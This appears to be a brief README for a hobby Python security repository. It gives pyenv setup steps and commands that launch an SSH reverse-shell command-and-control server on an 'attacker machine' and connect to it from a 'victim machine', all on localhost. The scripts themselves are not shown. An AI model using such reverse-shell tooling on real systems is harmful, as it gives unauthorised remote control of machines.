== Python Cyber and Fun

A bit of fun

== Installation

    pyenv virtualenv 3.11.3 cyber
    pyenv activate cyber
    pip install -r requirements.txt

== ssh testing with paramiko

You will need to generate a temporary RSA key

    ssh-keygen -t rsa -C "a@a.com" -f /tmp/test_rsa2.key

start the C2 ssh_reverse_shell on the attacker machine

    python src/ssh/ssh_reverse_shell.py 127.0.0.1 2222 username password

connect to C2 from victim machine

    python src/ssh/ssh_c2.py 127.0.0.1 2222 username password
